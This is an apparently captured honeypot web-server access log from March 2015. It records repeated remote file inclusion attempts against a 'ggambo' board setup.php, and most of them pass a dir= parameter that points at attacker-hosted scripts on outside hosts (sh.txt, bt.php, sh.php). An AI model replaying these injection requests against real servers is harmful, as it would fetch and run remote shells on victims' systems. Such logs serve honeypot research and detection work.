104.130.161.115 - - [30/Mar/2015:20:05:46 -0700] "GET /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:05:47 -0700] "GET /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 301 523 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:05:47 -0700] "GET /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
212.45.53.80 - - [30/Mar/2015:20:05:48 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_boardgallery/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:05:49 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_boardgallery/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:05:50 -0700] "POST /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:05:51 -0700] "POST /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:05:51 -0700] "GET ////bbs/skin/ggambo7002_boardgallery/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:05:52 -0700] "GET ////bbs/skin/ggambo7002_boardgallery/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:05:52 -0700] "POST ////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:05:53 -0700] "POST ////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:05:54 -0700] "GET /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:05:55 -0700] "GET /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:05:55 -0700] "POST /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
212.45.53.80 - - [30/Mar/2015:20:05:56 -0700] "POST /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14" 
104.130.161.114 - - [30/Mar/2015:20:06:38 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 553 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:06:38 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:06:39 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 553 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:06:39 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:06:44 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:06:44 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:06:45 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:06:45 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:07:16 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 301 564 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:07:16 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:07:17 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 301 564 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:07:17 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:07:22 -0700] "GET /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 301 523 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:07:22 -0700] "GET /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:07:24 -0700] "GET /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 301 523 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:07:24 -0700] "GET /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
184.107.137.250 - - [30/Mar/2015:20:08:20 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
184.107.137.250 - - [30/Mar/2015:20:08:21 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
184.107.137.250 - - [30/Mar/2015:20:08:22 -0700] "POST /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
184.107.137.250 - - [30/Mar/2015:20:08:23 -0700] "POST /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
184.107.137.250 - - [30/Mar/2015:20:08:23 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
184.107.137.250 - - [30/Mar/2015:20:08:24 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
184.107.137.250 - - [30/Mar/2015:20:08:24 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
184.107.137.250 - - [30/Mar/2015:20:08:25 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
184.107.137.250 - - [30/Mar/2015:20:08:25 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
184.107.137.250 - - [30/Mar/2015:20:08:26 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
184.107.137.250 - - [30/Mar/2015:20:08:26 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
184.107.137.250 - - [30/Mar/2015:20:08:27 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:33.0) Gecko/20100101 Firefox/33.0" 
104.130.161.114 - - [30/Mar/2015:20:08:59 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 553 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:08:59 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:09:15 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:09:15 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:10:05 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:10:05 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:10:06 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 553 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:10:06 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:10:07 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 553 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:10:07 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:10:12 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:10:12 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:10:14 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:10:14 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
198.144.188.26 - - [30/Mar/2015:20:11:56 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo6000_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:11:58 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo6000_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:11:58 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:11:59 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:11:59 -0700] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:12:00 -0700] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:12:01 -0700] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:12:02 -0700] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:12:02 -0700] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:12:03 -0700] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:12:03 -0700] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:12:05 -0700] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
104.130.161.114 - - [30/Mar/2015:20:16:39 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 553 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:16:39 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:16:41 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 553 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:16:41 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:16:49 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:16:49 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:16:50 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:16:50 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:17:26 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 553 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:17:26 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:17:29 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 553 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:17:29 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:17:37 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:17:37 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:17:41 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:17:41 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
181.65.186.35 - - [30/Mar/2015:20:17:44 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:17:45 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:17:46 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:17:48 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
112.218.68.155 - - [30/Mar/2015:20:17:50 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php?dir=http://hyprmart.com/mods//sh.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
181.65.186.35 - - [30/Mar/2015:20:17:51 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
112.218.68.155 - - [30/Mar/2015:20:17:52 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php?dir=http://hyprmart.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
112.218.68.155 - - [30/Mar/2015:20:17:52 -0700] "POST /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
181.65.186.35 - - [30/Mar/2015:20:17:52 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
112.218.68.155 - - [30/Mar/2015:20:17:54 -0700] "POST /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
181.65.186.35 - - [30/Mar/2015:20:17:54 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
112.218.68.155 - - [30/Mar/2015:20:17:55 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://hyprmart.com/mods//sh.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
181.65.186.35 - - [30/Mar/2015:20:17:56 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:17:56 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
112.218.68.155 - - [30/Mar/2015:20:17:56 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://hyprmart.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
112.218.68.155 - - [30/Mar/2015:20:17:57 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
112.218.68.155 - - [30/Mar/2015:20:17:58 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0" 
181.65.186.35 - - [30/Mar/2015:20:17:58 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
112.218.68.155 - - [30/Mar/2015:20:17:59 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
181.65.186.35 - - [30/Mar/2015:20:17:59 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
112.218.68.155 - - [30/Mar/2015:20:17:59 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0" 
112.218.68.155 - - [30/Mar/2015:20:18:00 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://hyprmart.com/mods//sh.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
181.65.186.35 - - [30/Mar/2015:20:18:01 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
112.218.68.155 - - [30/Mar/2015:20:18:01 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0" 
112.218.68.155 - - [30/Mar/2015:20:18:02 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://hyprmart.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
112.218.68.155 - - [30/Mar/2015:20:18:02 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
112.218.68.155 - - [30/Mar/2015:20:18:03 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0" 
112.218.68.155 - - [30/Mar/2015:20:18:03 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0" 
112.218.68.155 - - [30/Mar/2015:20:18:04 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
